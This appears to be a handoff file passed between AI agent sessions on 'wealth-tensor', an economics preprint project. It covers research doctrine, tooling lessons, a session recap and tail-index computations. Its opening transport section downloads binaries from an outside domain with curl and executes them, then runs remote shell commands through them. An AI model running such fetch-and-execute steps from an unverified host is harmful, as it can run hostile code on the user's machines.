---
project: wealth-tensor
gh_sha: fba25601f6dc4087b9fefbccddea3293c7cc13a1
updated: 2026-08-11
session: wealthTensor-09
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**Re-run before diagnosing.** *First collect has now worked in -06, -07, -08 and -09.* Cycle ~4 min.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-10 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-10 --resource wealth-tensor'
```

`roster claim` needs **`--who` AND `--resource`** (L23); both silent on success — confirm with
`roster who`. dx exit 3 = never ran, safe retry; exit 4 = check state first. **Do NOT route EDGAR or
bulk web work through darwin** (L18). **L36 — quote the remote path in `dx --get`.** **L20 — `dx --put`
fails if the parent directory does not exist; `dx 'mkdir -p …'` first.** *Both were hit again in -09,
so they are load-bearing, not folklore.*

## 1 · IDENTITY + MISSION

You are Jason's co-author on **wealth-tensor** — an eleven-year synthesis becoming **four
pre-prints** (ADR-001).

**Two intentions, equally weighted.** (1) Ship them. (2) **Have fun.** Hobby, no tenure, he is not
trying to be safe and says so.

**He invites criticism and means it, eight sessions deep.** -06 had its paper rejected the day it was
written. -07 found its one surviving claim was 116 years old. -08 killed the replacement framing
*and* the replacement's replacement. **-09 rewrote Paper III §9 from the completed reading, and then
its own adversarial pass killed the rewrite inside the hour.** His reaction to losing Paper I to a
1910 book was *"cheers to the lemonade — we should always celebrate when we can kill our darlings."*
**Agreeing with him is not the job. Agreeing with yourself is not the job. And -09 adds the third:
agreeing with your ADVERSARY is not the job either** — one prosecution hit was struck on an
eight-term grep the prosecution had not run.

**But do not agree with him reflexively.** -07: right about Böhm-Bawerk, wrong about Wicksteed within
the market, right about Wicksteed on the axis that matters. -08: he read Hildenbrand as narrower than
the audit claimed — RIGHT that it is narrow, WRONG about what narrows it. **-09: he diagnosed his own
citation habit unprompted and correctly** ("the JFE were items I had read working copies on… 1993-era
mistake, I didn't distinguish them"), and that diagnosis produced the reference apparatus's fourth
pass. **He is right often enough that checking is worth it and wrong often enough that checking is
necessary.**

**The prose is disposable; the structure is precious.** He remasters every sentence. What must NOT
happen is laundering *his* insight into your paraphrase. When he coins something it goes in
**verbatim** and is credited.

**His research notes are on paper.** Read the note back before building on it.

**Ask whether he has had his coffee.** A **register check, not a HITL gate.** *-08: "coffee locked and
loaded — switched to Folger's today, we'll have to test my mental agility against Maxwell House."*
*-09: asked, not answered — he was mid-flight on the citation question instead, which is a better
answer.* Answer in kind and keep moving.

**Audience: his three children, 18, 11 and 8.** It decided `docs/` stays public, that *Abandoned
Approaches* is in every paper, that failed pre-registrations are part of the deliverable, and that the
papers ship **with their own hostile referee reports.**

## 2 · ORIENT — run these, do not skim

```
git -C ~/repos/wealth-tensor pull --ff-only
python3 ~/repos/wealth-tensor/scripts/handoff_gate.py --check
cat  ~/repos/wealth-tensor/docs/papers/paper-III-dual-tensor/POSITIONING-002-second-pass.md   # ← START HERE
cat  ~/repos/wealth-tensor/docs/METHOD-001-the-phantom-tag.md               # READ BEFORE WRITING A CHECK
cat  ~/repos/wealth-tensor/docs/adr/ADR-001-paper-decomposition.md          # ALL SIX addenda
cat  ~/repos/wealth-tensor/docs/papers/paper-I-price-formation/RESULT-WT070-p3-is-dead.md
cat  ~/repos/wealth-tensor/docs/LEDGER.md                                   # 74 entries
python3 ~/repos/claude-blackbook/lessons.py doctrine
python3 ~/repos/claude-blackbook/lessons.py search "citations verification adversarial" --scope global
```

> **`POSITIONING-002` first, and read §6 before you cite anything.** §6 is a read-status table for
> every work in the crash-risk positioning. **Four of them have never been read at source and are
> deliberately absent from the paper.** That table is the single most useful thing in the repo right
> now, and it exists so you do not have to re-derive who has actually read what.
>
> `POSITIONING-001` is superseded but retained, with its three errors marked **in place**.

Corroborate what you use: `lessons.py use <id> --task <tag>` at orient,
`lessons.py record-outcome <tag> pass` at wrap. *-09 corroborated
`2026-08-10-reproducing-finding-from-code-proves-only` (it fired again, and paid again).*

## 3 · STATE

- **Code — 121 tests passing**, tree clean and pushed. **All three WT-07x scripts now carry the
  severity witness discipline**: `wt070` 18 severe · 1 definitional · 0 vacuous, **`wt071` 9 · 0 · 0**,
  **`wt072` 10 · 0 · 0**. All mutation-tested (WT-069); every substituted vacuous witness killed its
  run as required. §5 mission item 4 from -08 is **CLOSED**.
- **Paper II — v0.2, COMPLETE and DELIBERATELY UNSHIPPED. Do not ask him to submit it.** §4d. The
  house-style ruling is applied; nothing else moved. Zero live placeholders.
- **Paper III — v0.4, and §9 is *provisional*.** It was rewritten from `POSITIONING-001`, then
  demolished by its own adversarial pass, then rewritten again to what currently survives. **§4.4 now
  attributes its headline result to Bleck & Liu (2007).** All refs verified; the reference apparatus
  gained a **fourth pass (Version)** and a **third mark (✓⧗)**. §9 is not final — see §5 item 1.
- **Paper I — DEAD as briefed, twice over, and not written.** Jason's decision is **still open**:
  survive as a paper, or fold into IV? **Recommendation on the table is fold into IV.** Asked in -09,
  not answered.
- **Paper IV — unstarted**, and the likely home for what survives of I.
- **WT-026 CLOSED and it closed by failing. REG-001 stopping rule fired. No second port.**
- **Manuscript** (Google Doc `1RjAHJ7jHCX_N3ToHtstQvjlMb-BQz-iejBZ9Y4f58V8`) — untouched since S2.
  Restore points: S1 `1fszgf295NGfvfQlT3VaCrRXrXA4K589tlS-bVsUIok4` ·
  S2a `1FeXUSbrFQQXDOaSxCoul13lE6LWicxMuJGL8xJKSLjs` ·
  S2b `12jJh93VhgfOe8EQ3J23G9heQekSCdzxHTm75ut8RL6g`.

## 4 · DOCTRINE / GUARDRAILS

- **Blanket edit permission on the manuscript.** Fresh restore point before every edit session, and
  **VERIFY it**.
- **Never add a free parameter to absorb an objection.** Refused **six** times.
- **WT-049** every pre-registration states its BRIDGE assumption as a numbered proposition.
  **WT-052** a registration precedes the INSTRUMENT'S CODE. **WT-053** every published number comes
  from a committed script that has been run.
- **WT-065 — adversarial review fires when a finding is about to be CALLED a result** — ledger, paper
  text, or telling Jason, whichever is **first**. **Three consecutive sessions of proof.** In -09 it
  killed a section that had been written from a completed reading, one hour after it was written.
- **WT-057 — grep the WRONG form across every file after a correction.** -09's instance: two quote
  defects in `POSITIONING-001` were corrected in place, and the sweep confirmed the wrong forms
  existed nowhere else.
- **WT-058** a multi-anchor edit validates ALL anchors before writing (`scripts/patchkit.py`, L25).
  *Exception:* whole-file replaces — edit a local copy and `dx --put`.
- **WT-059 — verifying a REFERENCE and verifying a CITATION are different acts.** *Discharged for
  Jin & Myers, Bleck & Liu and Andreou et al.; **UNDISCHARGED for four works listed in
  `POSITIONING-002` §6.***
- **WT-068 / WT-069 / WT-070 / WT-071 / WT-072 / WT-073** — unchanged from -08. WT-070 (**run a third
  agent instructed to DEFEND your paper**) is now **three for three**: in -09 the defender supplied
  the assumed-not-derived correction of §4, found Bleck & Liu where the prosecution had buried it in a
  list, and caught the prosecution's over-reach.
- **NEW · WT-074 — a completed reading is not a completed search.** §9 was rewritten *from* the
  reading and still died, because `POSITIONING-001` reached its source by **string search**. Grep
  answers *is my quote real*; it does not answer *what else is in here*. **Read the introduction of
  your nearest neighbour** — that is where authors park the cases they considered and set aside.
- **NEW · WT-075 — a working copy cited as the article of record is the phantom tag in a third
  medium.** Bibliographic can't catch it (the article exists); provenance can't catch it (a working
  copy on your own disk *is* your own copy). Hence the fourth pass, **Version**, and the **✓⧗** mark:
  cite the published article for the RESULT, attribute the QUOTATION to the version you read,
  dual-date `consulted/published`, and say the sentence may not appear in the article of record.
- **NEW · WT-076 — a claim with a sharp boundary writes its own severity witness.** When the claim is
  a discontinuity, each side is the other's falsifying world. Corollary, and the useful half:
  **a claim for which no witness suggests itself may be a claim with no edge.**
- **An adversarial agent is a retrieval pipeline in a better suit.** Verify its most damaging claim
  yourself, mechanically, before it enters a document. In -09 three agent claims were checked that way
  and all three held; four others were tabled and kept out of the paper.
- **The tone is load-bearing.** No grumpiness; humour lands the news, especially bad news.

## 4b · THE HOUSE STYLE — **RULED 2026-08-11, and APPLIED 2026-08-11**

> **Jason's ruling: KEEP THE METHOD DISCLOSURES, CUT THE SELF-GRADING.**

Method disclosures — pre-registration, commit-pinning, Abandoned Approaches placement, the public
`docs/` coda — **stay at full strength.** They are the only certification an unaffiliated preprint
has. What goes is the paper **grading its own conduct**.

**APPLIED in -09** (commit `cabbebb`): Paper II → v0.2, one instance, the one Jason named verbatim
(*"the refinement is the prize"*). Paper III, five, inside v0.4. **No result, number, claim or
citation changed in either paper.**

**ONE LEFT IN PLACE AND FLAGGED, AWAITING JASON.** Paper III §7: *"That argument is withdrawn, and the
reason it is withdrawn is worth more than the argument was."* By the letter it is self-grading; it
grades a piece of *reasoning* rather than the author's conduct, and it opens the passage stating the
ruling's own principle — *"A paper does not get to grade its own integrity; a reader grades it, or
does not."* **Register is his. Do not cut it unilaterally.**

## 4d · **NOTHING SHIPS UNTIL THE CORPUS IS DONE** — Jason's ruling, 2026-08-11. **Binding.**

> **Jason:** *"I want to wait until we have the corpus done (so we can test it end to end; right now
> we're testing the individual parts like those who use error-statistical philosophy; correct approach
> here — when we're done with the papers, I want to re-test the entire system at once)."*

**A methodological position, not a scheduling preference, and it is his.** Shipping II now would spend
the corpus's one chance at an end-to-end severe test to bank an early win.

- **Do not ask him to submit Paper II, or III, or I.** The question is closed. **Five consecutive
  handoffs treated it as an unmade decision before -08 surfaced it. It was a made decision, and he
  had simply never been asked in a way that surfaced the reason.**
- Publication ORDER in ADR-001 unchanged — II → III → I → IV is the order of the *submission batch*.
- **A session's job is to get papers to DONE, not out the door.**
- **The end-to-end test is a deliverable and is still undesigned.** *What would it mean for the four
  papers to fail as a SYSTEM, as opposed to one of them failing?* Nothing in the repo answers it, and
  it must be answered **before the fourth paper is finished** — a test designed once the result is
  known is not a severe test, which is the whole point of his ruling. **Still unclaimed after two
  sessions of it being available.**

## 4c · DEFINITION OF DONE

> **Three** preprints publicly posted — **II, III and IV** (Paper I folds into IV, ADR-001
> addendum 7, Jason's ruling 2026-08-11) — each carrying: abstract, keywords, JEL codes, a numbered
> contributions list, an Abandoned Approaches section, a limitations section, a data/code availability
> statement naming the repo and a pinned commit SHA, and *Independent researcher* as the affiliation.
> Paper III additionally cites PRE-001/002 and their registering commit SHAs. **Paper IV
> additionally carries Paper I's surviving identity — the crossing height IS the volume — and
> Paper I's Abandoned Approaches, which will be the longest such entry in the corpus.** When the
> third is posted, this project is done and the repo becomes an archive.

**Progress: II done and unshipped. III at v0.4 with §9 provisional. I dead. IV unstarted.** Drive at
finishing.

## 5 · MISSION — ranked

### 1 — **DISCHARGE `POSITIONING-002` §6, THEN FINALISE §9.** The highest-value work available.

**Four works reached the repo through adversarial agents and none is in the paper.** Read them at
source — the way -09 read Jin & Myers and Bleck & Liu: fetch the PDF, `pdftotext`, grep, eyes on the
extracted text. **In priority order:**

1. **Ryan (1995, *JAR* 33)** — *A model of accrual measurement with implications for the evolution of
   the book-to-market ratio.* **May displace Beaver & Ryan (2000) as the closest prior art to §4's
   filter**, because B&R (2000) is an empirical decomposition and this is a *model*. §9 currently
   names B&R (2000) as closest; if that is wrong, §9 is wrong. **Ask Jason first** (L30/L24).
2. **Kim & Zhang (2016, *CAR*)** — conditional conservatism **lowers** crash risk, 1964–2007. **This
   may already be §4.2's comparative static, empirically supported.** Simultaneously a ceiling on
   novelty and the closest thing to corroboration this framework has ever had. Handle both halves.
3. **Kim, Wang & Zhang (2016, *CAR*)** — CEO overconfidence; a manager who genuinely misperceives.
   Blocks any loose use of "non-agency." One sentence in §9, but it must be there.
4. **Zhu (2016, *RAST*)** — accruals accumulate to a tipping point and release at once. Agency-based,
   so cheap to distinguish; a string cite.

**Do not cite any of them from a summary.** The programme has now been demolished three times for
positioning written from something other than the source.

### 2 — **ASK JASON: does Paper I survive, or fold into IV?** Open, asked in -09, unanswered.

`RESULT-WT070` and ADR-001 addendum 5 carry the argument. **Recommendation: fold into IV**, whose
charter already covers composition across scales. **Not Paper III** — force-fit, and the WT-042 alarm
was audible. What survives is subsection-sized: **the crossing height IS the volume**, *D*(*p*\*) =
*S*(*p*\*) = |*H* \ *T*| — plus a large Abandoned Approaches entry.

### 3 — **ASK JASON: should §9's HOME LITERATURE move?** New in -09, and it is the bigger question.

**Recommendation: move it from crash risk to conservatism and measurement.** Crash risk is crowded,
empirical and agency-dominated; Paper III is theory-only with two failed registrations and concedes it
is "much the weaker of the two accounts" on evidence. It loses there on the axis of competition and
always will. **Conservatism-as-a-dynamic-system is a modelling gap rather than a priority contest** —
that literature models conditional conservatism as a contemporaneous asymmetric response coefficient
(the Basu regression), and §4 models it as threshold-crossing accumulation under a continuous
observability parameter. A failed asset-class prediction is a normal open question there, not a
refutation. **This is a repositioning of the paper, not an edit to §9, so it is his.**

### 4 — **§7's flagged sentence.** One word from Jason and it goes. §4b.

### 5 — **Attribution pass (WT-044).** Still absent: **Sraffa, Robinson, Samuelson, Godley/Lavoie,
Farmer, Lillo** in II–IV. **And Wicksteed.** Check his library first (L24/L30).

### 6 — **Citation-graph whitespace test (WT-006).** `verify: grep -ril openalex src/ scripts/`

### 7 — **ASK Jason, cheap, genuinely his.** Checkbox lists (WT-008) — all 57 manuscript references
render as `- [ ]`; *recommend* plain bullets. The twin document (WT-009) — `2The Axiomatic
Reconstruction of`, 19 KB, never diffed; *recommend* spending one call on it.

### 8 — **PRE-003: the segment-level test.** Teed up deliberately, NOT started. Registers from
scratch, states its bridge proposition (WT-049), obeys WT-052 and WT-068, and **may not cite
PRE-001/002's failure as support for anything.**

### 9 — **Language remaster.** His job, explicitly. A word wrong in the FIELD'S TECHNICAL REGISTER is
yours (WT-060); a word that is merely his is not.

### TEED UP, small: `crisis_threshold` and `n_crises` in `lag.py` still carry the old vocabulary.

### PARKED, do not start — **THE MONOGRAPH.** After Paper IV. ADR-001 §Relitigation record.

## 6 · VERIFY GATE

```
cd ~/repos/wealth-tensor && ./.venv/bin/python -m pytest tests/ -q   # expect 121 passed
./.venv/bin/python scripts/wt070_p3_fold.py     # 18 severe · 1 definitional · 0 vacuous
./.venv/bin/python scripts/wt071_refuter.py     #  9 severe · 0 definitional · 0 vacuous
./.venv/bin/python scripts/wt072_coupling.py    # 10 severe · 0 definitional · 0 vacuous
./.venv/bin/python scripts/wt018_report.py · wt027_report.py · wt002_lambda_report.py · wt030_report.py
./.venv/bin/python scripts/wt066_p3_port.py     # exits 0; ends on the REG-001 §7 stopping-rule note
                                                # and NO verdict line. See L37 — do NOT grep for the
                                                # literal string "NO VERDICT"; it is not in the output.
git commit ...                                  # the LAST content commit
python3 scripts/handoff_gate.py --stamp
git commit -am "docs: stamp handoff gh_sha to HEAD"
python3 scripts/handoff_gate.py --emit
bash ~/Scripts/gate-selfcheck.sh                # expect PASS
/tmp/dx '~/Scripts/roster leave --who big-wealthTensor-10'   # ← YOUR id, not -09
```

**`--emit` does not stamp**, and refuses on `gate_passed: false`. Walk
`~/Desktop/downloads/HANDOFF-GATE.md` — trust the file header for the version.

## 7 · ORIENT-THEN-GO

Emit ONE orientation line — `Oriented: <state> · next at-bat: <X> · opening with <first action>.` —
then proceed. Do not wait for Jason's go.

---

## LUT — hard-won facts. Read before touching anything.

| # | Fact |
|---|---|
| **L41** | **NEW — an agent prompt ending in a paste marker with nothing pasted ships an EMPTY context, silently.** -09's prosecution prompt ended `=== THE SECTION ===` with no section. The agent said so and landed the session's fatal hit anyway, from the two-line summary. **Two lessons, and the second is the one that matters:** check the tail of a long prompt before sending; and *a hit available from a summary was available to any referee who had opened the source at all.* |
| **L40** | **NEW — `pdftotext -layout` on a TWO-COLUMN paper interleaves the columns and manufactures false adjacency.** -09's first read of Andreou et al. produced a sentence that looked self-contradicting because two columns had been zipped together. **Run `pdftotext` WITHOUT `-layout` for reading order** and reserve `-layout` for tables. Cheap, and it cost a wrong belief for several minutes. |
| **L39** | **NEW — `api.crossref.org` rate-limits to HTTP 429 within a few calls.** Space them, or go to the publisher / institutional-repository / RePEc page instead — **RePEc mirrors publisher abstracts verbatim** and answered three bibliographic questions in -09 that Crossref and Wiley (403) would not. An author's institutional repository is also where the FINAL volume/issue/pages live when the copy you have is EarlyView-paginated. |
| **L38** | **NEW — a green-OA PDF may be the publisher's own typesetting AND still have the wrong pagination.** Andreou et al.'s deposited copy carries the Wiley title page but is EarlyView-paginated 1–28, while the issue is 34(4), 2158–2185. **It is the text of record and NOT the pagination of record.** Cite the issue, quote without page numbers, and say why. |
| **L37** | **NEW — `wt066_p3_port.py` does not print the string "NO VERDICT".** The -08 handoff's gate line said "expect NO VERDICT", which reads as a literal. It exits 0 and ends on the REG-001 §7 stopping-rule note with no verdict line — *the absence is the expectation.* **Write gate expectations as what to LOOK FOR, not as prose a future session will grep.** |
| **L36** | **Quote the remote path in `dx --get`.** `/tmp/dx --get ~/repos/x /tmp/x` fails: the **cloud** shell expands `~` to `/root` before dx sees it. Single-quote it. *Confirmed again in -09.* |
| **L35** | **"Keep the superseded reasoning" is how a handoff grows a contradiction.** When an item closes, **REWRITE THE SECTION**; the reasoning belongs in the ledger, which is append-only by design. **RE-READ YOUR OWN HANDOFF AFTER ANY LATE CORRECTION.** No script does it. |
| **L34** | **archive.org search-inside settles print-vs-transcription in two calls.** `GET https://archive.org/metadata/<id>` → `d1`/`dir`; then `GET https://<d1>/fulltext/inside.php?item_id=<id>&doc=<id>&path=<dir>&q=%22exact+phrase%22`. **Run TWO phrases from the same sentence**; agreeing leaves are the check against confabulation. |
| **L33** | **A web transcription's silence is not the print original's**, and figure-adjacent apparatus is what it drops. **If the passage is one you WANT, that is a reason to check harder, not less.** |
| **L32** | **An "aggregate" and a "half" look identical in code and are not the same object.** *Before asserting two quantities differ, ask whether the quantity you are reading is the one that is supposed to vary.* See WT-071 for the denominator version. |
| **L31** | **An order-reversing bijection makes two "layers" the same model.** **Grep your new module for one line that would be WRONG in the other layer; if there is none, you renamed.** |
| **L30** | **Jason's library is much larger than the indexed subset and he will go get books.** -07: seven volumes in one morning after a null. -08: Forni & Lippi AND Hildenbrand within an hour of each being named, both of which then DECIDED a verdict. **-09: he identified the version defect in his own library unprompted, which is the same asset pointed inward.** **ASK HIM. Every single time.** |
| **L29** | **Verify the EDITION before quoting a classic.** OLL texts carry **no pagination**, so a citation from one is a chapter reference, not a page reference (WT-059). |
| **L28** | **An agent asked to check a priority claim will AGREE with it unless you tell it not to.** Prompt with *"an over-eager priority claim is as damaging as a missed one"* and demand it state what it **could not access**. **AND RUN A THIRD AGENT INSTRUCTED TO DEFEND YOUR PAPER** (WT-070, now three for three). *-09 adds: the priority auditor's "WHAT I COULD NOT ACCESS" section listed eleven items and was the most honest part of its report.* |
| **L27** | **Measure a constrained quantity AFTER the last edit that touches it.** Never verify by re-reading the thing you just fixed. |
| **L26** | **`scripts/prototypes/` is one level deeper than `scripts/`.** A prototype importing `src/` needs `parent.parent.parent / "src"`. |
| **L25** | **`scripts/patchkit.py` for any multi-anchor documentation edit.** Anchor on a span with no internal newline. *Whole-file replaces: edit locally and `dx --put`.* **And a markdown file re-wrapped at 100 columns will defeat a multi-line anchor — read the exact lines before matching.** *(-09 hit this on the first §9 edit.)* |
| **L24** | **Jason's library settles citation questions the web cannot.** `~/Desktop/downloads` (flat) and `/Volumes/Jason2/BOOK MASTERS`. **Search by TITLE.** **`find` at full depth TIMES OUT — use `-maxdepth 2`.** `pdftotext` at `/opt/homebrew/bin/pdftotext`. **A null is "not in the indexed subset", NOT "he does not own it."** *Beware the stem: `-iname "*forni*"` matches every book with "California" in the title.* |
| **L23** | `roster claim` requires `--who` AND `--resource`. Both print nothing on success; confirm with `roster who`. |
| **L22** | A mutation harness editing a Python source in place must clear `__pycache__` between mutants AND print a mutation-specific fingerprint. **An INCOMPLETE mutant is worse than none.** |
| **L21** | **The pre-registration workflow:** commit the registration **alone**, push, *then* write the analysis code, *then* compute. AMENDED by WT-052. |
| **L20** | `dx --put` fails if the parent directory does not exist on darwin. `dx 'mkdir -p …'` first. *Hit again in -09 — the error names the path and still reads like a transport failure.* |
| **L19** | The CIK→SIC map including dead registrants is `sub.txt` inside the SEC Financial Statement Data Set quarterly ZIPs. A universe from a current registrant list is a **survivorship trap**. |
| **L18** | **The cloud container reaches `data.sec.gov` and `www.sec.gov` directly.** Do not route bulk web data through darwin. *But DO route single-PDF fetch-and-`pdftotext` through darwin — that is how -09 verified four sources mechanically, and it is the project's answer to WT-059.* |
| **L17** | **EDGAR `companyfacts`: Q4 is almost never tagged as a quarter.** Recover quarters by differencing cumulatives sharing a fiscal-year start date. |
| **L16** | Measure the manuscript, don't opine about it. |
| **L15** | Mutation-test any result you intend to publish, and confirm the *right* test screams. See L22, WT-069. |
| **L14** | `conftest.py` only fires under pytest; `scripts/` needs its own shim. |
| **L13** | **A multi-line commit message or script will not survive `dx`'s quoting** — nor will a heredoc. `dx --put` it to a file (for commits, **`.git/COMMIT_DRAFT`**, then `git commit -F`). *A draft in the working tree gets swept up by `git add -A`; inside `.git/` it does not.* **Nested quotes in a `dx 'python3 -c "…"'` one-liner fail the same way — put the script in a file.** `$HOME` in the cloud shell is `/root` — use literal `~` in dx paths, **quoted** (L36). |
| **L10** | Every model checked against a closed form, a published result, or a hand-verified case. |
| **L9** | venv at `.venv`. Tests: `./.venv/bin/python -m pytest tests/ -q`. Root `conftest.py` inserts `src/`. |

**Google Docs API** *(only if the manuscript is reopened)* — L1–L8, L11, L12 are in
`git log -p docs/HANDOFF.md`. The load-bearing four: **L11** use `find_and_replace_doc` to change
existing text. **L12** verify a doc edit *structurally* by exporting via the cloud
`Google_Drive__read_file_content` and diffing `#`-prefixed and list-item lines. **L3** never infer
indices by arithmetic. **L7** cloud `Google_Drive` is create/read only — but `copy_file` **is** a
create, so **restore points need no bridge**.

---

## WHAT wealthTensor-09 DID

**The at-bat was "rewrite Paper III §9 from `POSITIONING-001`." It was rewritten, and then it lost —
to its own adversarial pass, inside the hour, to a paragraph one page before the sentence it quotes.**

**The fact.** Jin & Myers, NBER WP 10453, pp. 4–5, *before their model begins*, consider "an opaque
firm run by a **saintly manager** who always acts in shareholders' interest" and give three
possibilities for how hidden news comes out. The third: *"think of good or bad news accumulating
within the firm until the difference between intrinsic value and share price reaches a critical value.
The news would then be released all at once, like a pressure vessel letting off steam."* **Non-agency
accumulate-to-threshold-then-release-at-once was published in 2004.** §9 had just positioned the paper
as *the non-agency generator of the same asymmetry.*

**What survives, read forensically rather than defensively.** *Saintly ≠ ignorant* — "saintly"
qualifies capture, not information, and it is **investors** who "cannot see the news as it happens";
an informed party still holds the wedge and §4 has none. Their case is **two-sided** and they assign
it **kurtosis, not skew** — then enter kurtosis as a **control** against which their agency crash
results are identified. **Their non-agency channel is the nuisance term they partial out.** And their
paper contains **zero** occurrences of `goodwill`, `intangible`, `impair`, `GAAP`, `asset class`,
`book value`, `historical cost`, `historic cost` — all eight counted.

**The larger casualty was not Jin & Myers.** **Bleck & Liu (2007, *JAR* 45(2))**, verified in full
text, state §4.4's result nineteen years earlier and in prose: historic cost *"stabilizes asset prices
in the short term. Under the veil of this apparent stability, volatility actually accumulates only to
hit the market at a later date."* §4.4 now says so **in place**, at the table, rather than making a
reader travel to §9 for it.

**And the correction worth keeping, which came from the defence attorney.** *§4's asymmetry is
ASSUMED, not DERIVED.* Jin & Myers obtain one-sidedness from symmetric primitives. §4 assumes a
one-signed physical layer — which is **not sufficient**, because stochastic degradation around a
booked rate gives a two-signed error, which is their case again. The wedge is one-signed only if
reported value may fall and may not rise, and **that is conditional conservatism — Basu's object.**
`POSITIONING-001` had listed Basu as **Threat 1, to be scoped around.** He is not the threat; he is
the machinery the programme had not noticed it was standing on.

**Jason's own contribution was the session's most reusable artifact, and he made it unprompted.**
Shown that the Jin & Myers quotes came from the working paper, he said: *"the Journal of Financial
Economics were items I had read working copies on and I (wrongly) assumed them to be the useful
versions; 1993-era mistake, I didn't distinguish them."* That produced the reference apparatus's
**fourth pass — Version** — and the **✓⧗** mark, because the three existing passes structurally cannot
catch it: bibliographic asks whether the article exists (it does), provenance asks whether it is your
copy (a working copy on your disk *is* your copy). **Neither asks whether the journal printed the
words.** *The unification: the phantom tag is a fielder credited with an out he never made; a working
copy cited as the article of record is a journal credited with words it never printed; the house style
is prose credited with a rigour it never performed. Three media, one animal.*

**One over-reach struck, in the other direction.** The prosecution held that Jin & Myers "predicted
the failure of the registered prediction in 2004." PRE-001 registered an ordering of recognition lags
across GAAP asset classes; see the eight-way zero-hit count. **Category error, struck on evidence run
by hand.** *This programme was wrong in both directions inside one session, which is the argument for
checking the adversary as hard as the author.*

**Two quotation defects found and corrected in `POSITIONING-001` by the same mechanical method.** The
Andreou et al. quote read "nonsignificant"; the abstract reads **"non-significant"** — and uses both
spellings in consecutive sentences, which is presumably how the pipeline blended them. Far worse: the
**27% crash incidence is the CRSP–Compustat–Execucomp universe; CRSP-wide is 23%.** §9 was about to
lead with the bare 27%.

**And the work that simply got done.** `wt071` and `wt072` retrofitted to the witness discipline
(9 · 0 · 0 and 10 · 0 · 0), both mutation-tested, closing -08's mission item 4 — and **building the
witnesses corrected `wt071`'s own prose**: the 26× ratio's denominator swings 12.9× across *N* and its
numerator swings 4.6×, so "dominated by the denominator" was two claims in one assertion and is now
two checks. The house-style ruling applied to both papers, with one sentence flagged and left for
Jason. Four global lessons banked. Reference apparatus extended. **121 tests, three content commits
plus the handoff, all pushed, tree clean, gate PASS.**

*The lesson of the session, and it is not -08's.* That one learned that a control which resamples is
not a control. **This one learned that a completed reading is not a completed search.** The reading
was done — POSITIONING-001 was two sessions overdue and it was finally done properly — and the
programme still lost the section, because the source had been reached by **string search**. Grep
answers *is my quote real.* It does not answer *what else is in here.*

**Three sessions, three framings, three deaths, and each one found by us before it found a referee.**
The saintly manager had been sitting on page four since 2004, one page from the sentence we quoted,
waiting for someone to read the paragraph instead of the line. 🪃⚾

---
---

# ⚒️ wealthTensor-11 — READ THIS SECTION FIRST, IT SUPERSEDES §5 ABOVE

*Written at the end of `wealthTensor-10`. The mission list in §5 is stale. This is the brief.*

## 0 · THE DOCTRINE THAT CHANGED, AND IT IS THE MOST IMPORTANT LINE IN THIS FILE

> **WT-078 · COACHES, NOT UMPIRES.** Jason's ruling, 2026-08-12, and it corrects ten sessions of
> practice including everything `wealthTensor-10` did before he stopped it twice.
>
> *"An umpire calls balls and strikes — case closed. A coach notices a problem and offers a
> corrective. The boards that regulate vehicle safety don't smash cars so manufacturers can sell
> crashed cars; they smash them and hand back actionable evidence on what to improve."*
>
> **Every adversarial agent must cut both ways.** Not *"Bill and Alice scooped you"* but
> **"Bill and Alice scooped you — and here is what Bill and Alice MISSED."** The recon mission is
> *"guys, this won't work as-is, but this will."* **Finding the whitespace is the job.** A report
> that only tears down is a failed report, however correct.

> **WT-079 · THE DELIVERABLE IS THE PAPER, NOT A LIST OF FIXES.** Jason rewrites everything in his
> own hand at the end — that is his stated method and it is not negotiable. What he needs from a
> session is a **straw man in the prose**, so he can work with **two windows open, not six**, and
> decide how much weight each move gets in his own vernacular. **Handing him notes-about-fixes puts
> him back at square one.** `wealthTensor-10` produced four excellent documents and not one
> improved sentence *in a paper*, and he said so.

> **WT-080 · RUN THE MATH BEFORE WRITING THE FINDING.** *"No point in wasting ink."* If it comes
> back negative it goes in Abandoned Approaches — **that is research and it is fine.** WT-077 below
> is the first instance and it came back positive.

> **WT-081 · THE PAPERS MUST POSITIVELY CONTRIBUTE, AND MAY BE FUN.** No-grumpiness applied to
> research prose. *"Nobody has time for a paper that affirms how rock-solid its own process was."*
> Coase is funny. Akerlof won a Nobel writing about used cars. Wit is what confidence sounds like;
> it is not in tension with rigour. **The register was never missing from these drafts — it was
> outnumbered by apologies.** Take the apologies off and it returns on its own.

## 1 · WT-077 — THE COMPUTATION RAN, AND ROAD ONE IS TRUE

`scripts/wt077_tail_index.py`, committed and run. Kesten tail index α solving E[a^α] = 1, where
a(η) = A(η)/(1+μ), on the large-*w* multiplier where wage and rebate are negligible.

| levy | κ | ess-sup *a* | **α** |
|---|---|---|---|
| none | 0.00000 | 3.2857 | *unstable — condenses, matching the paper's own `none` row* |
| stock r=0.025 | 0.02500 | 3.2036 | 2.4430 |
| stock r=0.100 | 0.10000 | 2.9571 | 8.0456 |
| flow r=0.250 | 0.02554 | 2.7024 | 2.9696 |
| **flow r=1.000** | **0.10216** | **0.9524** | **NO POWER LAW — ess-sup a < 1** |

**Matched budget, which is the test:**

| κ | stock α | flow α | verdict |
|---|---|---|---|
| 0.0250 | 2.4430 | **2.9107** | flow thinner |
| 0.0500 | 4.0824 | **7.4821** | flow thinner |
| 0.1000 | 8.0456 | **∞ (no root)** | flow thinner |

**All three falsifiers survived.** α orders monotonically with *r* within each base; the r=1 flow
case admits no finite root; and at every matched κ the flow levy yields the larger α.
And Var[log a] at matched budget: stock 0.076536 (κ=0.100) against flow 0.051189 (κ=0.102) —
**the flow levy cuts the log-multiplier's variance by a third more for the same money.**

> **The result, stated at the strength the evidence supports:** at equal compressive budget a levy
> contingent on the realised gain thins the stationary tail more than a proportional levy on the
> stock, because it truncates the growth multiplier's upper tail where the stock levy merely scales
